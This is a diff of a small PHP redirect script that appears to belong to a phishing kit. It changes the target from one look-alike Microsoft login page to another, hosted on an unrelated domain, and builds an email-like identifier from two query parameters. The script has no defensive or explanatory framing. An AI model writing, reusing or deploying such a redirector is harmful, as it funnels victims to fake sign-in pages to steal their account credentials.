@@ -11,6 +11,6 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://resandstat.com/login-microsoftonline/auth/login.php?client_id=" . $_GET['client_id'] . "", false);
+Redirect("https://simholdings.com/portal-microsoftonlineazure.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
 
 ?>
